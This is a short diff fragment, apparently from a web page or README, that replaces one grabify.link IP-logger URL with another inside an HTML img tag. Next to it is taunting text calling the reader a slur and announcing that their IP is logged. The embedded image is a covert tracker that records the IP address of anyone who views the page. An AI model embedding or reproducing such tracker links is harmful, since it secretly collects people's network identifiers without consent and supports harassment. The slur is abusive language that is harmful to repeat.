@@ -8,5 +8,5 @@ GET IP LOGGED
 
  GET IP LOGGEDDD RETARD
 
-<img src="https://grabify.link/5MB56J">
+<img src="https://grabify.link/P7Q3NF">
 
